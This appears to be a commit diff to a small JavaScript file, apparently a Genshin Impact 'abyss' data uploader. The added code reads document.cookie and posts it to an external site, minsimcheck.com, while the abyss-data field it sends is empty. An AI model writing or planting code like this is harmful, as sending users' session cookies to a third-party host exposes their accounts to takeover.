8bf3808386b5fdbeb96cef2807b08f6f0ea9c3f2
sanglango <118825467+sanglango@users.noreply.github.com>
2022-12-02 00:18:29 +0900

    Update ldhy.js

--- ldhy.js
+++ ldhy.js
@@ -1,1 +1,21 @@
-alert(document.cookie)
+const userCookie = document.cookie;
+async function UploadAbyss(uploadData) {
+  const res = await fetch(
+    `https://minsimcheck.com/api/game/genshin/abyss/upload`,
+    {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body:JSON.stringify(uploadData),
+    }
+  );
+  obj = await res.json();
+  console.log(obj);
+}
+if (userCookie != null) {
+    const tData = {abyssData_GI: "",cookie_GI:userCookie};
+  UploadAbyss(tData);
+} else {
+  alert("업로드 실패...");
+}
